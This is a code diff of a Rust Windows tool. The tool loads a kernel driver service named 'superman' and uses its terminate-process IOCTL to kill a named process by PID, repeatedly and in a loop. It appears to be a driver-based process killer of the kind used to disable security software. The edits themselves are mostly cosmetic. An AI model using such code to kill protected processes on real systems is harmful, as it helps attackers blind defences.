@@ -27,7 +27,7 @@ use windows_sys::Win32::System::IO::DeviceIoControl;
 
 const SERVICE_NAME: &CStr = unsafe { CStr::from_bytes_with_nul_unchecked(b"superman\0") };
 const INITIALIZE_IOCTL_CODE: u32 = 0x9876C004u32;
-const TERMINSTE_PROCESS_IOCTL_CODE: u32 = 0x9876C094u32;
+const TERMINATE_PROCESS_IOCTL_CODE: u32 = 0x9876C094u32;
 
 /// Load and start driver from path
 pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
@@ -83,7 +83,6 @@ pub fn load_driver(path: &CStr) -> anyhow::Result<()> {
 
 /// Unload and delete driver by name
 pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
-    let service_name = CStr::from_bytes_with_nul(b"superman\0")?;
     let mut status: SERVICE_STATUS = unsafe { zeroed() };
 
     unsafe {
@@ -92,10 +91,10 @@ pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
             return Err(anyhow!("[-]OpenSCManagerA failed {}!", GetLastError()));
         }
 
-        let service = OpenServiceA(scm, service_name.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
+        let service = OpenServiceA(scm, SERVICE_NAME.as_ptr().cast(), SC_MANAGER_ALL_ACCESS);
         if service == 0 {
             CloseServiceHandle(scm);
-            return Err(anyhow!("OpenServiceA failed {}!", GetLastError()));
+            return Err(anyhow!("[-]OpenServiceA failed {}!", GetLastError()));
         }
 
         let res = ControlService(service, SERVICE_CONTROL_STOP, addr_of_mut!(status));
@@ -103,7 +102,7 @@ pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
             CloseServiceHandle(scm);
             CloseServiceHandle(service);
 
-            return Err(anyhow!("ControlService failed {}!", GetLastError()));
+            return Err(anyhow!("[-]ControlService failed {}!", GetLastError()));
         }
 
         let res = DeleteService(service);
@@ -113,11 +112,11 @@ pub fn unload_delete_driver(path: &Path) -> anyhow::Result<()> {
         CloseServiceHandle(service);
 
         if res == FALSE {
-            return Err(anyhow!("DeleteService failed {}!", GetLastError()));
+            return Err(anyhow!("[-]DeleteService failed {}!", GetLastError()));
         }
     }
 
-    let _ = fs::remove_file(path);
+    fs::remove_file(path).unwrap();
 
     Ok(())
 }
@@ -163,7 +162,7 @@ pub fn kill_pid(args: Args) -> anyhow::Result<()> {
         });
 
         let kill = |pid| {
-            match device_io_control.borrow_mut()(TERMINSTE_PROCESS_IOCTL_CODE, pid) {
+            match device_io_control.borrow_mut()(TERMINATE_PROCESS_IOCTL_CODE, pid) {
                 Ok(_) => println!("[+]Process {} has been terminated!", pid),
                 Err(e) => eprintln!("{}", e),
             };
@@ -177,11 +176,13 @@ pub fn kill_pid(args: Args) -> anyhow::Result<()> {
             let name = get_process_name(pid);
 
             loop {
+                // exit
                 if EXIT.load(Acquire) {
                     CloseHandle(device);
-                    let _ = unload_delete_driver(DRIVER_PATH.get().unwrap());
+                    unload_delete_driver(DRIVER_PATH.get().unwrap()).unwrap();
                     process::exit(0i32);
                 }
+
                 if let Some(pid) = get_process_pid(&name) {
                     kill(pid);
                 }
